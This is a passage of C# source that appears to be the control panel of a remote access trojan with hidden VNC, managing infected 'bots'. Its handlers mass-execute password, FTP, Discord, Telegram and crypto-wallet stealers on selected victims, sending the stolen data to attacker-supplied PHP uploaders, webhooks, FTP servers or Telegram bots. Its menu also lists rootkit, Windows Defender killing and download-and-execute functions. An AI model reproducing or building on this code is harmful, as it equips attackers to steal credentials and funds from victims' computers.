                if (getIp(clients[i].Client.RemoteEndPoint.ToString()) == client)
                {
                    result = clients[i];
                }
            }
            return result;
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
        }

        private void massExecuteStealerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (ClientsList.SelectedItems.Count == 0)
                {
                    MessageBox.Show("You have to select a Bot first! ");
                    return;
                }
                if (!string.IsNullOrWhiteSpace(Settings.Default.PHPLINK))
                {
                    url = Settings.Default.PHPLINK;
                    hVNC hVNC2 = new hVNC();
                    foreach (object selectedItem in ClientsList.SelectedItems)
                    {
                        _ = selectedItem;
                        count = ClientsList.SelectedItems.Count;
                    }
                    for (int i = 0; i < count; i++)
                    {
                        hVNC2.Name = "VNCForm:" + Conversions.ToString(ClientsList.SelectedItems[i].GetHashCode());
                        object tag = ClientsList.SelectedItems[i].Tag;
                        string xip = ClientsList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                            .Replace("}", null)
                            .Replace(":", null)
                            .Remove(0, 1);
                        string xhostname = ClientsList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                            .Replace("}", null)
                            .Replace(":", null)
                            .Remove(0, 1);
                        xxip = xip;
                        xxhostname = xhostname;
                        hVNC2.xip = xip;
                        hVNC2.xhostname = xhostname;
                        hVNC2.Tag = tag;
                        hVNC2.IcarusRecovery(url);
                        hVNC2.Dispose();
                    }
                    MessageBox.Show("Execution successfully To Selected Bots: " + count);
                    return;
                }
                string text = Interaction.InputBox("\nInput PHP Uploader Url here.\n\nOnly PHP url.", "Url");
                if (string.IsNullOrEmpty(text))
                {
                    return;
                }
                Settings.Default.PHPLINK = text;
                Settings.Default.Save();
                hVNC hVNC3 = new hVNC();
                foreach (object selectedItem2 in ClientsList.SelectedItems)
                {
                    _ = selectedItem2;
                    count = ClientsList.SelectedItems.Count;
                }
                for (int j = 0; j < count; j++)
                {
                    hVNC3.Name = "VNCForm:" + Conversions.ToString(ClientsList.SelectedItems[j].GetHashCode());
                    object tag2 = ClientsList.SelectedItems[j].Tag;
                    string xip2 = ClientsList.SelectedItems[j].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                        .Replace("}", null)
                        .Replace(":", null)
                        .Remove(0, 1);
                    string xhostname2 = ClientsList.SelectedItems[j].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                        .Replace("}", null)
                        .Replace(":", null)
                        .Remove(0, 1);
                    xxip = xip2;
                    xxhostname = xhostname2;
                    hVNC3.xip = xip2;
                    hVNC3.xhostname = xhostname2;
                    hVNC3.Tag = tag2;
                    hVNC3.IcarusRecovery(text);
                    hVNC3.Dispose();
                }
                MessageBox.Show("Execution successfully To Selected Bots: " + count);
            }
            catch (Exception)
            {
                MessageBox.Show("An Error Has Occured When Trying To Execute Stealer on all Bots");
                Close();
            }
        }

        private void massExcuteFTPStealerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (ClientsList.SelectedItems.Count == 0)
                {
                    MessageBox.Show("You have to select a Bot first! ");
                    return;
                }
                if (!string.IsNullOrWhiteSpace(Settings.Default.FTPHOST))
                {
                    domain = Settings.Default.FTPHOST;
                    user = Settings.Default.FTPUSER;
                    pass = Settings.Default.FTPPASS;
                    hVNC hVNC2 = new hVNC();
                    foreach (object selectedItem in ClientsList.SelectedItems)
                    {
                        _ = selectedItem;
                        count = ClientsList.SelectedItems.Count;
                    }
                    for (int i = 0; i < count; i++)
                    {
                        hVNC2.Name = "VNCForm:" + Conversions.ToString(ClientsList.SelectedItems[i].GetHashCode());
                        object tag = ClientsList.SelectedItems[i].Tag;
                        string xip = ClientsList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                            .Replace("}", null)
                            .Replace(":", null)
                            .Remove(0, 1);
                        string xhostname = ClientsList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                            .Replace("}", null)
                            .Replace(":", null)
                            .Remove(0, 1);
                        xxip = xip;
                        xxhostname = xhostname;
                        hVNC2.xip = xip;
                        hVNC2.xhostname = xhostname;
                        hVNC2.Tag = tag;
                        hVNC2.IcarusFTPRecovery(domain, user, pass);
                        hVNC2.Dispose();
                    }
                    MessageBox.Show("Execution successfully To Selected Bots: " + count);
                    return;
                }
                string text = Interaction.InputBox("\nInput FTPHost here.\n\nOnly Host.", "Host");
                if (string.IsNullOrEmpty(text))
                {
                    return;
                }
                string text2 = Interaction.InputBox("\nInput FTP User here.\n\nOnly User.", "User");
                if (string.IsNullOrEmpty(text2))
                {
                    return;
                }
                string text3 = Interaction.InputBox("\nInput FTP Pass here.\n\nOnly pass.", "Pass");
                if (string.IsNullOrEmpty(text3))
                {
                    return;
                }
                Settings.Default.FTPHOST = text;
                Settings.Default.FTPUSER = text2;
                Settings.Default.FTPPASS = text3;
                Settings.Default.Save();
                hVNC hVNC3 = new hVNC();
                foreach (object selectedItem2 in ClientsList.SelectedItems)
                {
                    _ = selectedItem2;
                    count = ClientsList.SelectedItems.Count;
                }
                for (int j = 0; j < count; j++)
                {
                    hVNC3.Name = "VNCForm:" + Conversions.ToString(ClientsList.SelectedItems[j].GetHashCode());
                    object tag2 = ClientsList.SelectedItems[j].Tag;
                    string xip2 = ClientsList.SelectedItems[j].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                        .Replace("}", null)
                        .Replace(":", null)
                        .Remove(0, 1);
                    string xhostname2 = ClientsList.SelectedItems[j].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                        .Replace("}", null)
                        .Replace(":", null)
                        .Remove(0, 1);
                    xxip = xip2;
                    xxhostname = xhostname2;
                    hVNC3.xip = xip2;
                    hVNC3.xhostname = xhostname2;
                    hVNC3.Tag = tag2;
                    hVNC3.IcarusFTPRecovery(text, text2, text3);
                    hVNC3.Dispose();
                }
                MessageBox.Show("Execution successfully To Selected Bots: " + count);
            }
            catch (Exception)
            {
                MessageBox.Show("An Error Has Occured When Trying To Execute Stealer on all Bots");
                Close();
            }
        }

        private void massExecuteDiscordStealerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (ClientsList.SelectedItems.Count == 0)
                {
                    MessageBox.Show("You have to select a Bot first! ");
                    return;
                }
                if (!string.IsNullOrWhiteSpace(Settings.Default.HOOK))
                {
                    url = Settings.Default.HOOK;
                    hVNC hVNC2 = new hVNC();
                    foreach (object selectedItem in ClientsList.SelectedItems)
                    {
                        _ = selectedItem;
                        count = ClientsList.SelectedItems.Count;
                    }
                    for (int i = 0; i < count; i++)
                    {
                        hVNC2.Name = "VNCForm:" + Conversions.ToString(ClientsList.SelectedItems[i].GetHashCode());
                        object tag = ClientsList.SelectedItems[i].Tag;
                        string xip = ClientsList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                            .Replace("}", null)
                            .Replace(":", null)
                            .Remove(0, 1);
                        string xhostname = ClientsList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                            .Replace("}", null)
                            .Replace(":", null)
                            .Remove(0, 1);
                        xxip = xip;
                        xxhostname = xhostname;
                        hVNC2.xip = xip;
                        hVNC2.xhostname = xhostname;
                        hVNC2.Tag = tag;
                        hVNC2.IcarusDiscRecovery(url);
                        hVNC2.Dispose();
                    }
                    MessageBox.Show("Execution successfully To Selected Bots: " + count);
                    return;
                }
                string text = Interaction.InputBox("\nInput Discord Webhook here.\n\nOnly Webhook.", "Webhook");
                if (string.IsNullOrEmpty(text))
                {
                    return;
                }
                Settings.Default.HOOK = text;
                Settings.Default.Save();
                hVNC hVNC3 = new hVNC();
                foreach (object selectedItem2 in ClientsList.SelectedItems)
                {
                    _ = selectedItem2;
                    count = ClientsList.SelectedItems.Count;
                }
                for (int j = 0; j < count; j++)
                {
                    hVNC3.Name = "VNCForm:" + Conversions.ToString(ClientsList.SelectedItems[j].GetHashCode());
                    object tag2 = ClientsList.SelectedItems[j].Tag;
                    string xip2 = ClientsList.SelectedItems[j].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                        .Replace("}", null)
                        .Replace(":", null)
                        .Remove(0, 1);
                    string xhostname2 = ClientsList.SelectedItems[j].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                        .Replace("}", null)
                        .Replace(":", null)
                        .Remove(0, 1);
                    xxip = xip2;
                    xxhostname = xhostname2;
                    hVNC3.xip = xip2;
                    hVNC3.xhostname = xhostname2;
                    hVNC3.Tag = tag2;
                    hVNC3.IcarusDiscRecovery(text);
                    hVNC3.Dispose();
                }
                MessageBox.Show("Execution successfully To Selected Bots: " + count);
            }
            catch (Exception)
            {
                MessageBox.Show("An Error Has Occured When Trying To Execute Stealer on all Bots");
                Close();
            }
        }

        private void massExecuteTelegramStealerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (ClientsList.SelectedItems.Count == 0)
                {
                    MessageBox.Show("You have to select a Bot first! ");
                    return;
                }
                if (!string.IsNullOrWhiteSpace(Settings.Default.TGTOKEN))
                {
                    tgchatid = Settings.Default.TGID;
                    tgtoken = Settings.Default.TGTOKEN;
                    hVNC hVNC2 = new hVNC();
                    foreach (object selectedItem in ClientsList.SelectedItems)
                    {
                        _ = selectedItem;
                        count = ClientsList.SelectedItems.Count;
                    }
                    for (int i = 0; i < count; i++)
                    {
                        hVNC2.Name = "VNCForm:" + Conversions.ToString(ClientsList.SelectedItems[i].GetHashCode());
                        object tag = ClientsList.SelectedItems[i].Tag;
                        string xip = ClientsList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                            .Replace("}", null)
                            .Replace(":", null)
                            .Remove(0, 1);
                        string xhostname = ClientsList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                            .Replace("}", null)
                            .Replace(":", null)
                            .Remove(0, 1);
                        xxip = xip;
                        xxhostname = xhostname;
                        hVNC2.xip = xip;
                        hVNC2.xhostname = xhostname;
                        hVNC2.Tag = tag;
                        hVNC2.IcarusTGRecovery(tgchatid, tgtoken);
                        hVNC2.Dispose();
                    }
                    MessageBox.Show("Execution successfully To Selected Bots: " + count);
                    return;
                }
                string text = Interaction.InputBox("\nInput Telegram Chat ID here.\n\nOnly ID.", "ID");
                if (string.IsNullOrEmpty(text))
                {
                    return;
                }
                string text2 = Interaction.InputBox("\nInput Telegram Bot Token here.\n\nOnly Token.", "Token");
                if (string.IsNullOrEmpty(text2))
                {
                    return;
                }
                Settings.Default.TGID = text;
                Settings.Default.TGTOKEN = text2;
                Settings.Default.Save();
                hVNC hVNC3 = new hVNC();
                foreach (object selectedItem2 in ClientsList.SelectedItems)
                {
                    _ = selectedItem2;
                    count = ClientsList.SelectedItems.Count;
                }
                for (int j = 0; j < count; j++)
                {
                    hVNC3.Name = "VNCForm:" + Conversions.ToString(ClientsList.SelectedItems[j].GetHashCode());
                    object tag2 = ClientsList.SelectedItems[j].Tag;
                    string xip2 = ClientsList.SelectedItems[j].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                        .Replace("}", null)
                        .Replace(":", null)
                        .Remove(0, 1);
                    string xhostname2 = ClientsList.SelectedItems[j].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                        .Replace("}", null)
                        .Replace(":", null)
                        .Remove(0, 1);
                    xxip = xip2;
                    xxhostname = xhostname2;
                    hVNC3.xip = xip2;
                    hVNC3.xhostname = xhostname2;
                    hVNC3.Tag = tag2;
                    hVNC3.IcarusTGRecovery(tgchatid, tgtoken);
                    hVNC3.Dispose();
                }
                MessageBox.Show("Execution successfully To Selected Bots: " + count);
            }
            catch (Exception)
            {
                MessageBox.Show("An Error Has Occured When Trying To Execute Stealer on all Bots");
                Close();
            }
        }

        private void massExecuteWalletStealerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (ClientsList.SelectedItems.Count == 0)
                {
                    MessageBox.Show("You have to select a Bot first! ");
                    return;
                }
                if (!string.IsNullOrWhiteSpace(Settings.Default.PHPLINK))
                {
                    url = Settings.Default.PHPLINK;
                    hVNC hVNC2 = new hVNC();
                    foreach (object selectedItem in ClientsList.SelectedItems)
                    {
                        _ = selectedItem;
                        count = ClientsList.SelectedItems.Count;
                    }
                    for (int i = 0; i < count; i++)
                    {
                        hVNC2.Name = "VNCForm:" + Conversions.ToString(ClientsList.SelectedItems[i].GetHashCode());
                        object tag = ClientsList.SelectedItems[i].Tag;
                        string xip = ClientsList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                            .Replace("}", null)
                            .Replace(":", null)
                            .Remove(0, 1);
                        string xhostname = ClientsList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                            .Replace("}", null)
                            .Replace(":", null)
                            .Remove(0, 1);
                        xxip = xip;
                        xxhostname = xhostname;
                        hVNC2.xip = xip;
                        hVNC2.xhostname = xhostname;
                        hVNC2.Tag = tag;
                        hVNC2.IcarusWalletsRecovery(url);
                        hVNC2.Dispose();
                    }
                    MessageBox.Show("Execution successfully To Selected Bots: " + count);
                    return;
                }
                string text = Interaction.InputBox("\nInput PHP Uploader Url here.\n\nOnly PHP url.", "Url");
                if (string.IsNullOrEmpty(text))
                {
                    return;
                }
                Settings.Default.PHPLINK = text;
                Settings.Default.Save();
                hVNC hVNC3 = new hVNC();
                foreach (object selectedItem2 in ClientsList.SelectedItems)
                {
                    _ = selectedItem2;
                    count = ClientsList.SelectedItems.Count;
                }
                for (int j = 0; j < count; j++)
                {
                    hVNC3.Name = "VNCForm:" + Conversions.ToString(ClientsList.SelectedItems[j].GetHashCode());
                    object tag2 = ClientsList.SelectedItems[j].Tag;
                    string xip2 = ClientsList.SelectedItems[j].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                        .Replace("}", null)
                        .Replace(":", null)
                        .Remove(0, 1);
                    string xhostname2 = ClientsList.SelectedItems[j].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                        .Replace("}", null)
                        .Replace(":", null)
                        .Remove(0, 1);
                    xxip = xip2;
                    xxhostname = xhostname2;
                    hVNC3.xip = xip2;
                    hVNC3.xhostname = xhostname2;
                    hVNC3.Tag = tag2;
                    hVNC3.IcarusWalletsRecovery(text);
                    hVNC3.Dispose();
                }
                MessageBox.Show("Execution successfully To Selected Bots: " + count);
            }
            catch (Exception)
            {
                MessageBox.Show("An Error Has Occured When Trying To Execute Stealer on all Bots");
                Close();
            }
        }

        private void massDownloadExecuteToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Manager));
            ShitarusPrivate.Bloom bloom1 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom2 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom3 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom4 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom5 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom6 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom7 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom8 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom9 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom10 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom11 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom12 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom13 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom14 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom15 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom16 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom17 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom18 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom19 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom20 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom21 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom22 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom23 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom24 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom25 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom26 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom27 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom28 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom29 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom30 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom31 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom32 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom33 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom34 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom35 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom36 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom37 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom38 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom39 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom40 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom41 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom42 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom43 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom44 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom45 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom46 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom47 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom48 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom49 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom50 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom51 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom52 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom53 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom54 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom55 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom56 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom57 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom58 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom59 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom60 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom61 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom62 = new ShitarusPrivate.Bloom();
            this.imageList1 = new System.Windows.Forms.ImageList(this.components);
            this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.controlManagementToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.startupToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.taskToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.miscOptionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.watcherToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.rootkitToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.killWindowsDefenderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.passwordsRecoveryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.stealAndSendToDiscordToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.massWalletStealerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.massDownloadExecuteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.serverControlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.uninstallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.restartToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.resetSizeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.updateBotsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.downloadExecutewithArgsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.icarussThiefToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.massExecuteStealerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.massExcuteFTPStealerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.massExecuteDiscordStealerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.massExecuteTelegramStealerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.massExecuteWalletStealerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.hVNCPanelToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.buildHVNCToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.remoteDesktopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.imageList2 = new System.Windows.Forms.ImageList(this.components);
            this.toolTip1 = new System.Windows.Forms.ToolTip(this.components);
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.timer2 = new System.Windows.Forms.Timer(this.components);
            this.primeTheme1 = new ShitarusPrivate.PrimeTheme();
            this.label3 = new System.Windows.Forms.Label();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.studioButton1 = new ShitarusPrivate.StudioButton();
            this.studioButton5 = new ShitarusPrivate.StudioButton();
            this.ClientsList = new System.Windows.Forms.ListView();
            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader3 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader4 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader5 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader6 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader7 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.studioButton4 = new ShitarusPrivate.StudioButton();
            this.studioButton3 = new ShitarusPrivate.StudioButton();
            this.panel1 = new System.Windows.Forms.Panel();
            this.txtSub = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.Expiry = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.chkListen = new ShitarusPrivate.JCS.ToggleSwitch();
            this.label1 = new System.Windows.Forms.Label();
            this.HVNCListen = new System.Windows.Forms.Label();
            this.contextMenuStrip1.SuspendLayout();
            this.primeTheme1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.panel1.SuspendLayout();
            this.SuspendLayout();
            // 
            // imageList1
            // 
            this.imageList1.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imageList1.ImageStream")));
            this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
            this.imageList1.Images.SetKeyName(0, "ad.png");
            this.imageList1.Images.SetKeyName(1, "ae.png");
            this.imageList1.Images.SetKeyName(2, "af.png");
            this.imageList1.Images.SetKeyName(3, "ag.png");
            this.imageList1.Images.SetKeyName(4, "ai.png");
            this.imageList1.Images.SetKeyName(5, "al.png");
            this.imageList1.Images.SetKeyName(6, "am.png");
            this.imageList1.Images.SetKeyName(7, "an.png");
            this.imageList1.Images.SetKeyName(8, "ao.png");
            this.imageList1.Images.SetKeyName(9, "ar.png");
            this.imageList1.Images.SetKeyName(10, "as.png");
            this.imageList1.Images.SetKeyName(11, "at.png");
            this.imageList1.Images.SetKeyName(12, "au.png");
            this.imageList1.Images.SetKeyName(13, "aw.png");
            this.imageList1.Images.SetKeyName(14, "ax.png");
            this.imageList1.Images.SetKeyName(15, "az.png");
            this.imageList1.Images.SetKeyName(16, "ba.png");
            this.imageList1.Images.SetKeyName(17, "bb.png");
            this.imageList1.Images.SetKeyName(18, "bd.png");
            this.imageList1.Images.SetKeyName(19, "be.png");
            this.imageList1.Images.SetKeyName(20, "bf.png");
            this.imageList1.Images.SetKeyName(21, "bg.png");
            this.imageList1.Images.SetKeyName(22, "bh.png");
            this.imageList1.Images.SetKeyName(23, "bi.png");
            this.imageList1.Images.SetKeyName(24, "bj.png");
            this.imageList1.Images.SetKeyName(25, "bm.png");
            this.imageList1.Images.SetKeyName(26, "bn.png");
            this.imageList1.Images.SetKeyName(27, "bo.png");
            this.imageList1.Images.SetKeyName(28, "br.png");
            this.imageList1.Images.SetKeyName(29, "bs.png");
            this.imageList1.Images.SetKeyName(30, "bt.png");
            this.imageList1.Images.SetKeyName(31, "bv.png");
            this.imageList1.Images.SetKeyName(32, "bw.png");
            this.imageList1.Images.SetKeyName(33, "by.png");
            this.imageList1.Images.SetKeyName(34, "bz.png");
            this.imageList1.Images.SetKeyName(35, "ca.png");
            this.imageList1.Images.SetKeyName(36, "catalonia.png");
            this.imageList1.Images.SetKeyName(37, "cc.png");
            this.imageList1.Images.SetKeyName(38, "cd.png");
            this.imageList1.Images.SetKeyName(39, "cf.png");
            this.imageList1.Images.SetKeyName(40, "cg.png");
            this.imageList1.Images.SetKeyName(41, "ch.png");
            this.imageList1.Images.SetKeyName(42, "ci.png");
            this.imageList1.Images.SetKeyName(43, "ck.png");
            this.imageList1.Images.SetKeyName(44, "cl.png");
            this.imageList1.Images.SetKeyName(45, "cm.png");
            this.imageList1.Images.SetKeyName(46, "cn.png");
            this.imageList1.Images.SetKeyName(47, "co.png");
            this.imageList1.Images.SetKeyName(48, "cr.png");
            this.imageList1.Images.SetKeyName(49, "cs.png");
            this.imageList1.Images.SetKeyName(50, "cu.png");
            this.imageList1.Images.SetKeyName(51, "cv.png");
            this.imageList1.Images.SetKeyName(52, "cx.png");
            this.imageList1.Images.SetKeyName(53, "cy.png");
            this.imageList1.Images.SetKeyName(54, "cz.png");
            this.imageList1.Images.SetKeyName(55, "de.png");
            this.imageList1.Images.SetKeyName(56, "dj.png");
            this.imageList1.Images.SetKeyName(57, "dk.png");
            this.imageList1.Images.SetKeyName(58, "dm.png");
            this.imageList1.Images.SetKeyName(59, "do.png");
            this.imageList1.Images.SetKeyName(60, "dz.png");
            this.imageList1.Images.SetKeyName(61, "ec.png");
            this.imageList1.Images.SetKeyName(62, "ee.png");
            this.imageList1.Images.SetKeyName(63, "eg.png");
            this.imageList1.Images.SetKeyName(64, "eh.png");
            this.imageList1.Images.SetKeyName(65, "england.png");
            this.imageList1.Images.SetKeyName(66, "er.png");
            this.imageList1.Images.SetKeyName(67, "es.png");
            this.imageList1.Images.SetKeyName(68, "et.png");
            this.imageList1.Images.SetKeyName(69, "europeanunion.png");
            this.imageList1.Images.SetKeyName(70, "fam.png");
            this.imageList1.Images.SetKeyName(71, "fi.png");
            this.imageList1.Images.SetKeyName(72, "fj.png");
            this.imageList1.Images.SetKeyName(73, "fk.png");
            this.imageList1.Images.SetKeyName(74, "fm.png");
            this.imageList1.Images.SetKeyName(75, "fo.png");
            this.imageList1.Images.SetKeyName(76, "fr.png");
            this.imageList1.Images.SetKeyName(77, "ga.png");
            this.imageList1.Images.SetKeyName(78, "gb.png");
            this.imageList1.Images.SetKeyName(79, "gd.png");
            this.imageList1.Images.SetKeyName(80, "ge.png");
            this.imageList1.Images.SetKeyName(81, "gf.png");
            this.imageList1.Images.SetKeyName(82, "gh.png");
            this.imageList1.Images.SetKeyName(83, "gi.png");
            this.imageList1.Images.SetKeyName(84, "gl.png");
            this.imageList1.Images.SetKeyName(85, "gm.png");
            this.imageList1.Images.SetKeyName(86, "gn.png");
            this.imageList1.Images.SetKeyName(87, "gp.png");
            this.imageList1.Images.SetKeyName(88, "gq.png");
            this.imageList1.Images.SetKeyName(89, "gr.png");
            this.imageList1.Images.SetKeyName(90, "gs.png");
            this.imageList1.Images.SetKeyName(91, "gt.png");
            this.imageList1.Images.SetKeyName(92, "gu.png");
            this.imageList1.Images.SetKeyName(93, "gw.png");
            this.imageList1.Images.SetKeyName(94, "gy.png");
            this.imageList1.Images.SetKeyName(95, "hk.png");
            this.imageList1.Images.SetKeyName(96, "hm.png");
            this.imageList1.Images.SetKeyName(97, "hn.png");
            this.imageList1.Images.SetKeyName(98, "hr.png");
            this.imageList1.Images.SetKeyName(99, "ht.png");
            this.imageList1.Images.SetKeyName(100, "hu.png");
            this.imageList1.Images.SetKeyName(101, "id.png");
